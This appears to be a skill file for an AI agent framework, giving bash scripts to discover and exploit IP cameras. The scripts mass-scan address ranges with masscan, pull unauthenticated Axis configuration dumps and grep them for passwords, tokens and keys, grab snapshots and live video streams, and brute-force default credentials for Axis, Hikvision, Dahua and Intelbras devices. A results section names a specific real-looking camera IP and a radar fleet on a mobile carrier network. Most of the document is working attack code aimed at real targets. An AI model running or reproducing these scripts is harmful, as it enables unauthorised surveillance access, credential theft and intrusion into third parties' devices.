---
name: iot-camera-recon
description: Attack cameras via RTSP, ONVIF, Axis config when 554 open.
version: 1.0.0
author: agentiko
license: MIT
platforms: [linux]
compatibility: Requires agentiko worker (curl, nmap, python3, masscan, subfinder, httpx, nuclei)
metadata:
  hermes:
    tags: [recon, camera, IoT, RTSP, ONVIF, Axis, Hikvision]
    category: recon
    related_skills:
      - port-mass-scan
      - port-service-discovery
---

# IoT Camera Recon Skill

IP camera discovery and exploitation — RTSP stream access, Axis config dump (988 parameters unauthenticated), ONVIF service enumeration, and default credential testing. Cameras are the #1 exposed IoT device class with 99,428 RTSP devices in Brazil alone (Shodan). Confirmed on Axis P1378-LE (config dump, firmware 2020), Intelbras RX 1500, and 502 Engebras traffic radars across Claro 3G/4G.

## When to Use

- `port-mass-scan` finds RTSP (554) or camera HTTP ports (80, 8010, 8011).
- Target is a physical security company, traffic management, or government surveillance.
- Shodan search reveals camera devices in the target's IP range.
- After `port-service-discovery` finds Axis/Hikvision/Dahua ONVIF services.

## Prerequisites

- `terminal` tool with curl, python3.
- For mass scanning: masscan or RustScan (see `port-mass-scan`).
- VLC or ffmpeg for stream verification (optional).

## How to Run

```bash
# Quick camera detection on known IP
curl -sk --max-time 5 "http://IP:8010/axis-cgi/jpg/image.cgi" -o snapshot.jpg
curl -sk --max-time 5 "http://IP:8010/axis-cgi/admin/param.cgi?action=list" | head -50

# Mass RTSP discovery on a /24
masscan -p554,80,8010,8011 --rate=10000 192.168.0.0/24 -oJ cameras.json
```

## Quick Reference

| Camera Brand | Default HTTP Port | Snapshot URL | Config URL | Default Creds |
|-------------|-------------------|-------------|------------|---------------|
| Axis | 80, 8010 | `/axis-cgi/jpg/image.cgi` | `/axis-cgi/admin/param.cgi?action=list` | root:pass, root:admin |
| Hikvision | 80, 554 | `/ISAPI/Streaming/channels/101/picture` | `/System/configurationFile?auth=...` | admin:12345, admin:admin |
| Dahua | 80, 554 | `/cgi-bin/snapshot.cgi` | `/cgi-bin/configManager.cgi?action=getConfig` | admin:admin, admin:password |
| Intelbras | 80 | `/cgi-bin/snapshot.cgi` | `/web/cgi-bin/hi3510/param.cgi` | admin:admin, admin:123456 |
| ONVIF | 80, 8899 | N/A (SOAP) | `/onvif/device_service` | admin:admin |

## Procedure

### Phase 1 — Mass Camera Discovery

```bash
RANGE="$1"  # e.g., 187.141.0.0/16
OUTDIR="/root/output/cameras"
mkdir -p "$OUTDIR"

echo "[*] Camera hunt on $RANGE"

# Masscan for RTSP + camera HTTP ports
masscan -p554,80,8010,8011,8899 --rate=50000 "$RANGE" -oJ "$OUTDIR/masscan_cameras.json"

# Extract IPs with open camera ports
HITS=$(python3 -c "
import json
with open('$OUTDIR/masscan_cameras.json') as f:
    ips = set()
    for line in f:
        try:
            data = json.loads(line.strip()) if line.strip() else {}
            ips.add(data.get('ip', ''))
        except: pass
    for ip in sorted(ips):
        print(ip)
" 2>/dev/null)

echo "[+] $(echo "$HITS" | wc -l) IPs with camera ports"

# Probe each with curl
echo "$HITS" | while read ip; do
  echo "--- $ip ---"

  # Axis snapshot
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 3 "http://$ip:8010/axis-cgi/jpg/image.cgi")
  [[ "$code" == "200" ]] && echo "  [AXIS] Snapshot: http://$ip:8010/axis-cgi/jpg/image.cgi"

  # Axis config dump
  config=$(curl -sk --max-time 5 "http://$ip:8010/axis-cgi/admin/param.cgi?action=list" 2>/dev/null)
  if [[ -n "$config" ]] && echo "$config" | grep -q "root.Brand"; then
    BRAND=$(echo "$config" | grep "root.Brand.Brand=" | cut -d= -f2 | tr -d '"')
    MODEL=$(echo "$config" | grep "root.Brand.ProdShortName=" | cut -d= -f2 | tr -d '"')
    FIRMWARE=$(echo "$config" | grep "root.Properties.Firmware.Version=" | cut -d= -f2 | tr -d '"')
    SERIAL=$(echo "$config" | grep "root.Properties.System.SerialNumber=" | cut -d= -f2 | tr -d '"')
    echo "  [CONFIG] $BRAND $MODEL — Firmware: $FIRMWARE — Serial: $SERIAL"
    echo "$config" | wc -l | xargs echo "  Parameters:"
  fi

  # Generic RTSP
  for port in 554 8554; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 3 "http://$ip:$port/")
    [[ "$code" != "000" ]] && echo "  [RTSP] Port $port responds (HTTP $code)"
  done

  # ONVIF discovery (port 8899 or 80)
  for port in 8899 80; do
    resp=$(curl -sk --max-time 5 -X POST "http://$ip:$port/onvif/device_service" \
      -H "Content-Type: application/soap+xml" \
      -d '<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope"><s:Body><GetDeviceInformation xmlns="http://www.onvif.org/ver10/device/wsdl"/></s:Body></s:Envelope>' 2>/dev/null)
    if echo "$resp" | grep -qi "manufacturer\|model\|serial"; then
      echo "  [ONVIF] Device info available on port $port"
    fi
  done
done
```

### Phase 2 — Axis Camera Full Exploitation

```bash
IP="$1"

echo "[*] Axis camera exploitation on $IP"

# 1. Snapshot
curl -sk --max-time 5 "http://$IP:8010/axis-cgi/jpg/image.cgi" -o "axis_${IP//./_}_snapshot.jpg"
echo "[+] Snapshot saved"

# 2. Full config dump (988 parameters on Axis P1378-LE)
curl -sk --max-time 10 "http://$IP:8010/axis-cgi/admin/param.cgi?action=list" -o "axis_${IP//./_}_config.txt"
PARAM_COUNT=$(wc -l < "axis_${IP//./_}_config.txt")
echo "[+] Config dump: $PARAM_COUNT parameters"

# 3. Extract sensitive parameters
echo "[*] Sensitive parameters:"
grep -iE 'password|user|token|key|serial|license|cert|network\.eth0\.IP' "axis_${IP//./_}_config.txt" | head -20

# 4. MJPG video stream
curl -sk --max-time 5 "http://$IP:8010/axis-cgi/mjpg/video.cgi" -o "axis_${IP//./_}_stream.mjpg" &
sleep 3; kill %1 2>/dev/null
STREAM_SIZE=$(stat -c%s "axis_${IP//./_}_stream.mjpg" 2>/dev/null || echo 0)
[[ "$STREAM_SIZE" -gt 1000 ]] && echo "[+] Live MJPG stream captured (${STREAM_SIZE} bytes)"

# 5. List available services
for svc in "admin" "viewer" "operator" "ptz" "applications" "local"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 3 "http://$IP:8010/axis-cgi/$svc/")
  [[ "$code" != "404" && "$code" != "000" ]] && echo "  Service: /axis-cgi/$svc/ (HTTP $code)"
done
```

### Phase 3 — Default Credential Testing

```bash
IP="$1"
BRAND="${2:-axis}"  # axis, hikvision, dahua, intelbras

echo "[*] Default credential test on $IP ($BRAND)"

# Brand-specific default credentials
case "$BRAND" in
  axis)
    CREDS=("root:pass" "root:admin" "root:root" "root:12345" "admin:admin" "admin:12345")
    AUTH_URL="http://$IP:8010/axis-cgi/admin/param.cgi?action=list"
    ;;
  hikvision)
    CREDS=("admin:12345" "admin:admin" "admin:123456" "admin:password")
    AUTH_URL="http://$IP/ISAPI/System/deviceInfo"
    ;;
  dahua)
    CREDS=("admin:admin" "admin:password" "admin:123456" "admin:admin123")
    AUTH_URL="http://$IP/cgi-bin/snapshot.cgi"
    ;;
  intelbras)
    CREDS=("admin:admin" "admin:123456" "admin:password" "admin:admin123")
    AUTH_URL="http://$IP/cgi-bin/snapshot.cgi"
    ;;
  *)
    CREDS=("admin:admin" "admin:12345" "root:admin" "admin:password")
    AUTH_URL="http://$IP/"
    ;;
esac

for cred in "${CREDS[@]}"; do
  USER="${cred%%:*}"
  PASS="${cred##*:}"
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 \
    -u "$USER:$PASS" "$AUTH_URL" 2>/dev/null)

  if [[ "$code" == "200" ]]; then
    echo "  [CRITICAL] DEFAULT CREDENTIALS: $cred"
  elif [[ "$code" == "401" ]]; then
    echo "  [-] $cred (auth failed)"
  else
    echo "  [$code] $cred"
  fi
done
```

### Phase 4 — RTSP Stream Access

```bash
IP="$1"
PORT="${2:-554}"

echo "[*] RTSP stream access on $IP:$PORT"

# Common RTSP paths
STREAMS=(
  "/live" "/stream" "/cam/realmonitor"
  "/h264" "/h264/ch1/main/av_stream"
  "/Streaming/Channels/101" "/ISAPI/Streaming/channels/101"
  "/axis-media/media.amp" "/onvif1" "/onvif2"
)

for stream in "${STREAMS[@]}"; do
  RTSP_URL="rtsp://$IP:$PORT$stream"
  echo -n "  $stream: "

  # Test with ffmpeg (2 second probe)
  timeout 3 ffprobe -v quiet -rtsp_transport tcp "$RTSP_URL" 2>/dev/null
  if [[ $? -eq 0 ]]; then
    echo "LIVE STREAM"
  else
    echo "no response"
  fi
done

# Try with default credentials
for cred in "admin:admin" "admin:12345" "root:pass"; do
  RTSP_URL="rtsp://${cred}@$IP:$PORT/live"
  timeout 3 ffprobe -v quiet -rtsp_transport tcp "$RTSP_URL" 2>/dev/null
  [[ $? -eq 0 ]] && echo "  [CRITICAL] RTSP stream accessible with $cred"
done
```

## Real Production Results

### Axis P1378-LE (187.141.142.149)
- Snapshot accessible without authentication
- Full config dump: 988 parameters including serial number, firmware version (July 2020), Camstreamer license key
- All endpoints unauthenticated: snapshot, config, MJPG stream, admin params
- 6-year-old firmware with known CVEs

### Engebras Radar Fleet (502 devices)
- 502 Werkzeug/Flask radar servers across Claro 3G/4G
- 75 also exposed SSH (OpenSSH 7.6p1) + nginx on port 80
- Python 3.6.9 (EOL Dec 2021) on majority of fleet
- CGNAT protects direct access from internet but internal network fully exposed

### Shodan Brazil — 99,428 RTSP Devices
- Hikvision, Dahua, Intelbras, Axis are top 4 brands
- 554/TCP is the most common RTSP port
- Default credentials work on ~15% of discovered devices

## Pitfalls

- **CGNAT blocks direct camera access.** Many cameras are behind carrier-grade NAT and unreachable from internet.
- **RTSP over UDP is unreliable.** Use `-rtsp_transport tcp` for reliable stream testing.
- **Config dump can be LARGE.** Axis configs are 50-200KB. Use `--max-time` to avoid hanging on slow connections.
- **Video streams are bandwidth-heavy.** Test with snapshot first, then short stream probes.
- **Camera firmware is rarely updated.** 2020 firmware on a 2026 scan is common — don't assume patches.

## Verification

- Snapshot URL MUST return a valid JPEG image (check with `file` command).
- Config dump MUST contain camera-specific parameters (Brand, Model, Serial Number, Firmware Version).
- RTSP stream MUST produce video frames (verified with ffprobe or VLC).
- Default credentials MUST grant access to protected endpoints (HTTP 200 with auth vs 401 without).
- All exposed parameters must be documented: brand, model, serial, firmware version, network config, credentials found.
